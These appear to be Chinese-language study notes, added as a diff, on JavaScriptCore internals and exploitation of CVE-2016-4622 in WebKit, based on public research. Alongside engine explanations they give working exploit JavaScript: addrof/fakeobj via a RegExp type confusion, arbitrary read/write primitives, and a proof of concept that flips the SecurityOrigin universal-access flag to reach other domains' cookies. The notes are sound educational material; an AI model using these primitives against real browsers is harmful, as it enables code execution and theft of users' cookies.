@@ -1003,3 +1003,663 @@ int main(int argc, char **argv)
 ```
 
 - 關鍵在於 `insns` 內部的行為
+
+
+
+### CVE-2016-4622 + JavascriptCore 內部機制
+
+#### env / background
+
+- 下載 WebKit 並切到有問題的版本
+
+  ```bash
+  git clone git://git.webkit.org/WebKit.git WebKit.git
+  git checkout 3af5ce129e6636350a887d01237a65c2fce77823
+  ```
+
+- 編譯 debug version 的 JSC
+
+  ```bash
+  Tools/Scripts/build-webkit --jsc-only --debug
+  ```
+
+  - 我在編譯時會遇到某個檔案的 180 行的 `Handle<JSC::Unknown>` 會是 ambiguous reference，解決方法只要改成 `JSC::Handle<JSC::Unknown>` 即可
+
+- 執行
+
+  ```bash
+  ./WebKitBuild/Debug/bin/jsc
+  ```
+
+相較 V8，JSC 的編譯速度實在是快很多，可能是因為直接在 MacOS 編譯而不是透過 Docker / Multipass 等等虛擬化技術包裝執行環境。
+
+- 下斷點：
+
+  ```
+  lldb> b JSC::mathProtoFuncMax
+  ```
+
+- 之後執行 `Math.max(1,2)` 即可在斷點處停止，如果要看前後 source code，可以下：
+
+  ```
+  l   // 下 10
+  l - // 前 10
+  ```
+
+執行過程中，可以使用 `describe(var)` 來看某個變數的詳細資料，輸出結果會像是：
+
+```c
+>>> describe([{}, 1, 13.37, [1, 2, 3], "test"])
+Object: 0x10b9b4390 with butterfly 0x8000e0038 (Structure 0x10b9f2ae0:[Array, {}, ArrayWithContiguous, Proto:0x10b9c80a0]), StructureID: 99
+```
+
+包含：
+
+- Object
+  - 4 bytes - struct ID
+  - 4 bytes - flags
+  - 8 bytes - butterfly
+  - 10 bytes ... - inline property
+- butterfly
+  - 8 bytes 為單位
+- Structure
+- Proto
+- Structure ID
+
+也能使用 `p *(JSC::JSObect*)` 印出對應 memory 其 `JSObject` 的架構
+
+而 JSC 會根據 array element 的不同，決定 array element 的型態，像是以下 case，連第一個 Int 也被轉成 Double：
+
+```
+>>> describe([1337])
+Object: 0x10b9b43a0 with butterfly 0x8000dc010 (Structure 0x10b9f2c30:[Array, {}, CopyOnWriteArrayWithInt32, Proto:0x10b9c80a0, Leaf]), StructureID: 102
+
+>>> describe([1337,13.37])
+Object: 0x10b9b43b0 with butterfly 0x8000dc030 (Structure 0x10b9f2ca0:[Array, {}, CopyOnWriteArrayWithDouble, Proto:0x10b9c80a0, Leaf]), StructureID: 103
+```
+
+JavascriptCore 內部儲存資料的方式都是以 8 bytes 為單位，而對於不同 type 有不同的存法，參考 [JSCJSValue src](https://github.com/WebKit/webkit/blob/main/Source/JavaScriptCore/runtime/JSCJSValue.h)：
+
+```c
+     * The top 15-bits denote the type of the encoded JSValue:
+     *
+     *     Pointer {  0000:PPPP:PPPP:PPPP
+     *              / 0002:****:****:****
+     *     Double  {         ...
+     *              \ FFFC:****:****:****
+     *     Integer {  FFFE:0000:IIII:IIII
+     ...
+          * The tag 0x0000 denotes a pointer, or another form of tagged immediate. Boolean,
+     * null and undefined values are represented by specific, invalid pointer values:
+     *
+     *     False:     0x06
+     *     True:      0x07
+     *     Undefined: 0x0a
+     *     Null:      0x02
+```
+
+並且在儲存眾多資料時，有一個特別的儲存方法稱作 **Butterfly**，意即某個 object 指向某塊記憶體空間時，上下分別會儲存不同的資料，像是一個蝴蝶一樣：
+
+```
+--------------------------------------------------------
+.. | propY | propX | length | elem0 | elem1 | elem2 | ..
+--------------------------------------------------------
+                            ^
+                            |
+            +---------------+
+            |
+  +-------------+
+  | Some Object |
+  +-------------+
+```
+
+- array element 會被存在 pointer 的下面
+- array length 以及 property 會被存在前面
+
+而 property 也有可能直接存在 `Object` 底下 `0xbadbeef0` 的部分 (inline object)，但是在超過一定大小 (6) 後還是會把多的 element 用 butterfly 來存，不過此時 Object 仍然有東西 (1~6 的 element value)。有關儲存方式更詳細的 layout：
+
+```
+            +------------------------------------------+
+            |                Butterfly                 |
+            | baz | bar | foo | length: 2 | 42 | 13.37 |
+            +------------------------------------------+
+                                          ^
+                                +---------+
+               +----------+     |
+               |          |     |
+            +--+  JSCell  |     |      +-----------------+
+            |  |          |     |      |                 |
+            |  +----------+     |      |  MethodTable    |
+            |       /\          |      |                 |
+ References |       || inherits |      |  Put            |
+   by ID in |  +----++----+     |      |  Get            |
+  structure |  |          +-----+      |  Delete         |
+      table |  | JSObject |            |  VisitChildren  |
+            |  |          |<-----      |  ...            |
+            |  +----------+     |      |                 |
+            |       /\          |      +-----------------+
+            |       || inherits |                  ^
+            |  +----++----+     |                  |
+            |  |          |     | associated       |
+            |  | JSArray  |     | prototype        |
+            |  |          |     | object           |
+            |  +----------+     |                  |
+            |                   |                  |
+            v                   |          +-------+--------+
+        +-------------------+   |          |   ClassInfo    |
+        |    Structure      +---+      +-->|                |
+        |                   |          |   |  Name: "Array" |
+        | property: slot    |          |   |                |
+        |     foo : 0       +----------+   +----------------+
+        |     bar : 1       |
+        |     baz : 2       |
+        |                   |
+        +-------------------+
+```
+
+JSC 的 JIT 分成多個不同層級：
+
+- tier 1: the LLInt interpreter - 預設
+- tier 2: the Baseline JIT compiler
+  - hot code
+  - statement in function 執行超過 100 次 or function 執行超過 6 次
+- tier 3: the DFG JIT
+  - statement in function 執行超過 1000 次 or function 執行超過 66 次
+  - Data Flow Graph，但是會先 converting bytecode into the **DFG CPS form**
+    - *CPS* (Continuation-Passing Style) 不會 return 而是直接將結果傳給下個 function
+    - 產生的 DFG 可以呈現變數跟臨時變數之間的關係 (data flow relation)
+- tier 4: the FTL JIT (now with our new B3 backend)
+  - faster than light
+  - 使用 compiler backend LLVM
+  - **The FTL JIT is designed to bring aggressive C-like optimizations to JavaScript**
+
+如果想觀察 JSC 在 JIT 時產生的 assembly code 或是其他更詳細的資訊，可以參考以下兩篇文章：
+
+- https://webkit.org/blog/6411/javascriptcore-csi-a-crash-site-investigation-story/
+- https://webkit.org/blog/3362/introducing-the-webkit-ftl-jit/
+- 可以在執行前加上環境變數來改變執行時的行為，而如查看 JIT 產生的 asm 就可以加上 `env JSC_dumpDisassembly=true`
+
+對於 JIT，type confusion 是一個很常見的漏洞，而從開發者的角度來看，JIT compiler 必須要注意：
+
+- free of side-effect
+- has effects on data
+- 需要注意 JITed code 是否有改變 object layout 的可能，可參考：https://www.zerodayinitiative.com/blog/2018/4/12/inverting-your-assumptions-a-guide-to-jit-comparisons
+
+**On Stack Replacement (OSR)** - a technique for switching between different implementations of the same function
+
+- you could use OSR to switch **from interpreted or unoptimized code** to **JITed code** as soon as it finishes compiling
+- When OSR occurs, the **VM is paused**, and the stack frame for the target function is **replaced by an equivalent frame** which may have variables in different locations
+- OSR 也有可能 **from optimized code** to **unoptimized code or interpreted code**
+  - 情況可能發生在 JIT 的 assumptions 是錯的，實際 function 的行為可能不如預期，此時就可以 fallback
+- [more OSR detail](https://stackoverflow.com/a/9105846)
+
+JIT 的過程：
+
+1. define function
+
+   ```c
+   >>> function x(meow) { var a = meow*3; return meow/2 + a; }
+   Generated JIT code for LLInt program prologue thunk:
+       Code at [0x5316d2c01820, 0x5316d2c01840):
+         0x5316d2c01820: mov $0x1012c1cc0, %rax
+         0x5316d2c0182a: jmp *%rax
+         0x5316d2c0182c: int3
+         0x5316d2c0182d: int3
+         0x5316d2c0182e: int3
+   ```
+
+2. 0x50 次 (Baseline)
+
+   ```c
+   Generated Baseline JIT code for <global>#AQs9DO:[0x10ba5c8c0->0x10ba64200, BaselineGlobal, 119], instruction count = 119
+      Source: for (var i = 0; i < 0x500; i++) x(15)
+      Code at [0x5316d2c02540, 0x5316d2c02e80):
+             0x5316d2c02540: push %rbp
+             0x5316d2c02541: mov %rsp, %rbp
+             0x5316d2c02544: mov $0x10ba5c8c0, %r11
+             0x5316d2c0254e: mov %r11, 0x10(%rbp)
+             0x5316d2c02552: lea -0x80(%rbp), %rsi
+             0x5316d2c02556: mov $0x106d13130, %r11
+             0x5316d2c02560: cmp %rsi, (%r11)
+             0x5316d2c02563: ja 0x5316d2c02d95
+             0x5316d2c02569: mov %rsi, %rsp
+               ...
+   ```
+
+3. 0x500 次 (DFG)
+
+   ```c
+   >>> Generated DFG JIT code for x#AKIxrP:[0x10ba50690->0x10ba50460->0x10bafcf20, DFGFunctionCall, 27], instruction count = 27:
+       Optimized with execution counter = 60.000000/1151.000000, -940
+       Code at [0x5316d2c037c0, 0x5316d2c03be0):
+             0x5316d2c037c0: push %rbp
+             0x5316d2c037c1: mov %rsp, %rbp
+             0x5316d2c037c4: mov $0x10ba50690, %r11
+             0x5316d2c037ce: mov %r11, 0x10(%rbp)
+             0x5316d2c037d2: lea -0x50(%rbp), %rsi
+             0x5316d2c037d6: mov $0x106d13130, %r11
+             0x5316d2c037e0: cmp %rsi, (%r11)
+             0x5316d2c037e3: ja 0x5316d2c03a27
+             0x5316d2c037e9: lea -0x40(%rbp), %rsp
+             0x5316d2c037ed: test $0xf, %spl
+             0x5316d2c037f1: jz 0x5316d2c037fe
+             0x5316d2c037f7: mov $0x64, %r11d
+             0x5316d2c037fd: int3
+             ...
+   ```
+
+4. 0x50000 次 (FTL)
+
+   ```c
+   ...
+   Unwind info for x#AKIxrP:[0x10ba508c0->0x10ba50460->0x10bafcf20, FTLFunctionCall, 27]:
+   localsOffset = 0 for stack slot: stack0 at 0x106c6feb0
+   Generated FTLMode code for x#AKIxrP:[0x10ba508c0->0x10ba50460->0x10bafcf20, FTLFunctionCall, 27], instruction count = 27:
+   BB#0: ; frequency = 1.000000
+                     0x5316d2c05580: push %rbp
+                     0x5316d2c05581: mov %rsp, %rbp
+                     0x5316d2c05584: lea -0x30(%rbp), %rsp
+   ...
+   ```
+
+
+
+如果可以在動態改變 object layout，就能造成 type confusion 並且做到 information leak，而開發者的對應方式為：如果該 function 會在動態更新 object，會被 marked 成 dangerous：`clobberWorld()`。
+
+- 像是 `String.ValueOf()` 可能會更改 structure，就是 dangerous (returns the **primitive value of the specified object**)
+
+
+
+#### exploit
+
+`addrof`：
+
+```js
+function addrof(val) {
+    var array = [13.37]; // create array
+    var reg = /abc/y; // create regular expression
+
+    // y for sticky:
+    // The sticky property reflects whether or not the search is sticky,
+    // (searches in strings only from the index indicated by the lastIndex property
+    // of this regular expression). sticky is a read-only property of
+    // an individual regular expression object
+    
+    // Target function
+    var AddrGetter = function(array) {
+        "abc".match(reg); // original: reg[Symbol.match]();
+        return array[0];
+        /* when it's jited, it will return double value (because of array[0]),
+         * but jit doesn't check if array[0] is still a double
+         */
+    }
+    
+    // Force optimization
+    // JIT it !
+    for (var i = 0; i < 10000; ++i)
+        AddrGetter(array);
+    
+    // Setup haxx
+    // Update array[0] to our target object when regex do lastIndex()
+    regexLastIndex = {};
+    regexLastIndex.toString = function() {
+        array[0] = val; // set the first element to an object
+        return "0";
+    };
+    reg.lastIndex = regexLastIndex;
+    
+    // Do it!
+    // return first element of array
+    return AddrGetter(array);
+    // lastIndex is an object ??! We need to get number from call lastIndex.toString() !
+    // Oh! I get "0" and the lastIndex must be 0 --> trigger exp
+}
+
+meow = {}
+print(describe(meow))
+print(addrof(meow))
+```
+
+在執行 `JSC_reportDFGCompileTimes=true ./jsc ./pwn.js` 的過程中，第一次的 iteration 會有兩次的 optimization 以及 failed，而他在內部做了兩次 optimization
+
+- to DFG
+- to FTL
+
+而在第二次的 iteration，成功印出 address，不過 optimization 只有 to DFG，因此如果降低 force JIT 的迴圈數，就能確保不會到 FTL，至此 exploit 100% 成功。
+
+接著執行 `JSC_dumpSourceAtDFGTime=true ./jsc ./pwn.js` 分析 DFG 內部優化究竟做了些什麼：
+
+```
+[1] Compiled AddrGetter#EmYVxR:[0x109850230->0x1098fcf20, BaselineFunctionCall, 46]
+'''function AddrGetter(array) {
+    "abc".match(reg); // original: reg[Symbol.match]();
+        return array[0];
+        /* when it's jited, it will return double value (because of array[0]),
+         * but jit doesn't check if array[0] is still a double
+         */
+    }'''
+```
+
+- 這邊指出要 optimize 哪個部分
+
+```
+[2] Inlined match#DLDZSb:[0x109850460->0x1098fd080, BaselineFunctionCall, 112 (ShouldAlwaysBeInlined) (StrictMode)] at AddrGetter#EmYVxR:[0x109850af0->0x10985
+0230->0x1098fcf20, DFGFunctionCall, 46] bc#33
+'''function match(regexp)
+{
+    "use strict";
+
+    if (this == null)
+        @throwTypeError("String.prototype.match requires that |this| not be null or undefined");
+
+    if (regexp != null) {
+        var matcher = regexp.@matchSymbol; // <--- do this
+        if (matcher != @undefined)
+            return matcher.@call(regexp, this);
+    }
+
+    let thisString = @toString(this);
+    let createdRegExp = @regExpCreate(regexp, @undefined);
+    return createdRegExp.@matchSymbol(thisString);
+}'''
+```
+
+- 這邊是 `match()` 的程式邏輯，由於 regexp 不為 null，會執行 `regexp.@matchSymbol`
+
+```
+[3] Inlined [Symbol.match]#BFrWhl:[0x109850690->0x1098b9130, BaselineFunctionCall, 119 (ShouldAlwaysBeInlined) (StrictMode)] at AddrGetter#EmYVxR:[0x109850af0
+->0x109850230->0x1098fcf20, DFGFunctionCall, 46] bc#52
+'''function [Symbol.match](strArg)
+{
+    "use strict";
+
+    if (!@isObject(this))
+        @throwTypeError("RegExp.prototype.@@match requires that |this| be an Object");
+
+    let str = @toString(strArg);
+
+    //
+    if (!@hasObservableSideEffectsForRegExpMatch(this)) // 這邊會檢查是否有 side effect
+        return @regExpMatchFast.@call(this, str);
+    return @matchSlow(this, str);
+}'''
+```
+
+- MatchSymbol 會執行 `[Symbol.match](strArg)`，有點怪的 function define
+  - js 會執行 `@overriddenName="[Symbol.match]"` 改掉 function name，該 function 原本也叫做 `match()`
+- 如果有 side effect 就走 `MatchSlow()`，沒有就走 `Fast.@call`
+
+```
+[4] Inlined hasObservableSideEffectsForRegExpMatch#DSRdGE:[0x1098508c0->0x1098bb2e0, BaselineFunctionCall, 106 (ShouldAlwaysBeInlined) (StrictMode)] at AddrGe
+tter#EmYVxR:[0x109850af0->0x109850230->0x1098fcf20, DFGFunctionCall, 46] bc#49
+'''function hasObservableSideEffectsForRegExpMatch(regexp)
+{
+    "use strict";
+
+    //
+    let regexpExec = @tryGetById(regexp, "exec");
+    if (regexpExec !== @regExpBuiltinExec)
+        return true;
+
+    let regexpGlobal = @tryGetById(regexp, "global");
+    if (regexpGlobal !== @regExpProtoGlobalGetter)
+        return true;
+    let regexpUnicode = @tryGetById(regexp, "unicode");
+    if (regexpUnicode !== @regExpProtoUnicodeGetter)
+        return true;
+
+	// patch commit 改成:
+	// return typeof regexp.lastIndex !== "number";
+	
+    return !@isRegExpObject(regexp);
+}'''
+```
+
+- 這裡檢查是否有 side effect
+
+在 DFG 執行 opcode 時 (Source/JavaScriptCore/dfg/DFGAbstractInterpreterInlines.h)：
+
+```c++
+...
+2230     case RegExpTest:
+2231         // Even if we've proven known input types as RegExpObject and String,
+2232         // accessing lastIndex is effectful if it's a global regexp.
+2233         clobberWorld();
+2234         setNonCellTypeForNode(node, SpecBoolean);
+2235         break;
+2236
+2237     case RegExpMatchFast:
+2238         ASSERT(node->child2().useKind() == RegExpObjectUse);
+2239         ASSERT(node->child3().useKind() == StringUse || node->child3().useKind() == KnownStringUse);
+2240         setTypeForNode(node, SpecOther | SpecArray);
+2241         break;
+...
+```
+
+可以看到 `RegExpTest` 有一則註解，說明 lastIndex 可能會發生問題，不過在 `RegExpMatchFast` 也沒有對資料做更深入的檢查，最後的修補方式是在 `hasObservableSideEffectsForRegExpMatch` 加上更多的檢查，不讓 `RegExpMatchFast `被執行到而走 slow path。
+
+
+
+`fakeobj`:
+
+```js
+function fakeobj(dbl) {
+    var array = [13.37];
+    var reg = /abc/y;
+
+    var AddrSetter = function(array) {
+        "abc".match(reg);
+        array[0] = dbl; // type confusion
+    }
+    
+    for (var i = 0; i < 10000; ++i)
+        AddrSetter(array);
+    
+    regexLastIndex = {};
+    regexLastIndex.toString = function() {
+        array[0] = {};
+        return "0";
+    };
+    reg.lastIndex = regexLastIndex;
+
+    AddrSetter(array);
+    return array[0]
+}
+```
+
+- 類似的 payload，不過 `toString()` 換成是將 `array[0]` assign 成 object，並在 JIT code 當中 assign 成傳入的 double value
+- 在 `toString()` 時會將原本的 array 從 `ArrayWithDouble` 轉為 `ArrayWithContiguous`，但因為 JIT code 並不會做 type casting，因此 `array[0] = dbl` 會覆蓋掉原本的 pointer 成我們輸入的 double value
+
+```js
+fake = {}
+// struct.unpack("d", struct.pack("Q", 0x0100160000001000-2**48))
+// 2*48 --> for double value encode, but JIT code will not to substract 2**48 (?)
+fake.a = 7.082855106403439e-304
+fake.b = 2
+fake.c = 1337
+delete fake.b // set 0
+print(addrof(fake))
+/* (In python) hax_addr = struct.unpack("Q", struct.pack("d", <address_u_got> + 0x10))
+ * hax = fakeobj(hax_addr)
+ * describe(hax)
+ */
+```
+
+- 在 assign pointer 時，double value 會被 encode，方式為額外加上 `2**48` ，因此在 assign 時必須要扣掉 `2**48`
+  - 而該情況是在存入的 value type 是 JSCValue 時才會 encode (Array 中有除了 Double 的 type)，如果是純 Double Array 就不用 encode，因此也不用減去 `2**48`
+- `delete <var>` 可以讓 `var` 對應的記憶體空間被清為 0
+- 到此，可以構造出任意的 JS object，不過要構造出怎樣的 object 才能做到 arbitrary code execution？ 
+
+Linus 在找 structure ID 的方法並非 spray，而是透過 increment struct ID 以及用 `instanceof ` 來檢查是否為 target structure：
+
+```js
+while (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
+    jsCellHeader.assignAdd(jsCellHeader, Int64.One);
+    wasmBuffer.jsCellHeader = jsCellHeader.asJSValue();
+}
+```
+
+在用 `new BufferArray()` 建立新的 array，並透過 `u32 = new Uint32Array(buf)` 以及 `f64` version，就能直接對 pointer 做操作，不用再透過手動用 python 做 cast:
+
+```js
+fake = {}
+fake.a = 7.082855106403439e-304
+fake.b = 2
+fake.c = 1337
+delete fake.b // set 0
+fake_addr = addrof(fake)
+f64[0] = fake_addr
+u32[0] += 0x10
+hax_addr = f64[0]
+hax = fakeobj(hax_addr)
+```
+
+
+
+而 [Niklas 的 exploit](https://github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html) 利用不同的方式實作了更 powerful 的 `addrof` 以及 `fakeobj` (?)，不過步驟複雜，建議是參考 LiveOverflow 的[說明](https://liveoverflow.com/preparing-for-stage-2-of-a-webkit-exploit/)
+
+
+
+https://liveoverflow.com/content/images/2019/07/ov3.gif
+
+Ref to LiveOverflow
+
+
+
+1. 建立 ArrayWithContiguous type 的 fake object：
+
+   ```js
+   // spray for structureID
+   // the type of structure_spray is ArrayWithContiguous
+   var structure_spray = [];
+   for (var i = 0; i < 1000; i++) {
+       var array = [13.37];
+       array.a = 13.37;
+       array['prop' + i] = 13.37;
+       structure_spray.push(array)
+   }
+   // the type of victim is ArrayWithDouble
+   var victim = structure_spray[510];
+   
+   u32[0] = 0x200; // for structureID
+   u32[1] = 0x01082007 - 0x10000 // why sub 0x10000?
+   var flags_double = f64[0]
+   u32[1] = 0x01082009 - 0x10000
+   var flags_cont = f64[0]
+   
+   // NonArray (inline properties)
+   var outer = {
+       cell_header: flags_cont,
+       butterfly: victim,
+   }
+   
+   f64[0] = addrof(outer)
+   u32[0] += 0x10
+   var hax = fakeobj(f64[0])
+   ```
+
+   - 由於 butterfly 指向 victim (實際上是 victim 的 metadata)，因此 hax 可以更動到 victim 的 metadata (cell_header + butterfly)，像是 `hax[0]` 就會是 victim 的 cell_header、`hax[1]` 會是 victim 的 butterfly
+
+2. 構造 boxed / unboxed 擁有相同 butterfly，用 unboxed assign 位置，在用 boxed 作為 pointer 任意存取；也能用 boxed 指向某個 object，並透過 unboxed 讀取 address：
+
+   ```js
+   var unboxed_size = 10
+   // CopyOnWriteArrayWithDouble
+   var unboxed = eval(`[${'13.37,'.repeat(unboxed_size)}]`)
+   unboxed[0] = 13.337 // not we need ArrayWithDouble
+   
+   var boxed = [{}] // JSCValue
+   
+   hax[1] = unboxed // change victim butterfly to unboxed metadata
+   var tmp_butterfly = victim[1] // get unboxed butterfly
+   
+   hax[1] = boxed // change victim butterfly to unboxed metadata
+   // set boxed butterfly to tmp_butterfly, which is shared with unboxed
+   victim[1] = tmp_butterfly
+   
+   // the idea is same as original reg bug
+   
+   stage2_addrof = function (obj) {
+       boxed[0] = obj;
+       return unboxed[0];
+   }
+   
+   stage2_fakeobj = function (addr) {
+       unboxed[0] = addr;
+       return boxed[0];
+   }
+   ```
+
+3. 任意讀 / 任意寫並不需要 powerful addrof / fakeobj，只需要使用第一階段的 addrof / fakeobj 即可：
+
+   ```js
+   outer.cell_header = flags_double
+   read64 = function(where) {
+       f64[0] = where;
+       u32[0] += 0x10; // .a offset is -0x10
+       hax[1] = f64[0];
+       return victim.a;
+   }
+   
+   write64 = function(where, what) {
+       f64[0] = where;
+       u32[0] += 0x10; // .a offset is -0x10
+       hax[1] = f64[0];
+       victim.a = what;
+   }
+   ```
+
+
+
+最後攻擊方法有許多種：
+
+- 下載 JIT 並且執行，在得到 JIT function 後拿到其 address，由於是 rwx，因此將 JIT 內容蓋寫成 shellcode 即可
+
+  - 不過並不是每個 Webkit 都會有 JIT
+
+- 找到 stack 並蓋寫 return address 成 ROP
+
+- 蓋寫用於避免 XSS 攻擊的 `securityPolicy`，以下 POC 參考原作者的 exploit：
+
+  ```js
+  var jsxhr = new XMLHttpRequest();
+  var jsxhrAddr = stage2.addrof(jsxhr);
+  var xhrAddr = stage2.read64(jsxhrAddr + 0x18);
+  var scriptExecContextAddr = stage2.read64(xhrAddr + 0x68);
+  var securityOriginPolicyAddr = stage2.read64(scriptExecContextAddr + 8);
+  var securityOriginAddr = stage2.read64(securityOriginPolicyAddr + 8);
+  
+  // m_universalAccess flag is at +0x31, set it to 1
+  var flags = stage2.read64(securityOriginAddr + 0x30);
+  stage2.write64(securityOriginAddr + 0x30, flags + 0x0100);
+  ```
+
+  - 存取到其他 domain 的 cookies
+
+
+
+最後 LiveOverflow 提出關於大家都使用 `addrof` 以及 `fakeobj` 作為 exploit primitive 的論點，除了可以構造任意的 JS object 之外，這個方法屬於 **reusable**，考慮到一些 exploit 在做 `gc()` 等操作時並會造成 memory corruption，如果我們找到新的 vuln 可以構造出 `addrof` 以及 `fakeobj`，就可以直接使用過去的 memory safe exploit
+
+- 只需要在新的 vuln 弄到 `addrof()` 以及 `fakeobj()`，其他 exploit 都可以 reuse
+- Steps
+  1. bug
+  2. `addrof` / `fakeobj`
+  3. arbitrary r/w
+  4. (memory clean)
+  5. do stuff ...
+
+
+
+資料參考來源：
+
+- [phrack](http://phrack.org/papers/attacking_javascript_engines.html)
+- [LiveOverflow](https://liveoverflow.com/topic/browser-exploitation/)
+- [WebKit-RegEx-Exploit](https://github.com/LinusHenze/WebKit-RegEx-Exploit)
+
+其他學習資源 (引用 LiveOverflow)：
+
+**JavaScriptCore** - Here are my reasons why I chose this engine.
+
+- [saelo's exploit for CVE-2018-4233](https://github.com/saelo/cve-2018-4233)
+  - another implementation by Niklas B - [regexp](https://github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html)
+- [Zero Day Initiative](https://twitter.com/thezdi) - [blog post](https://www.zerodayinitiative.com/blog/2019/3/14/the-apple-bug-that-fell-near-the-webkit-tree)
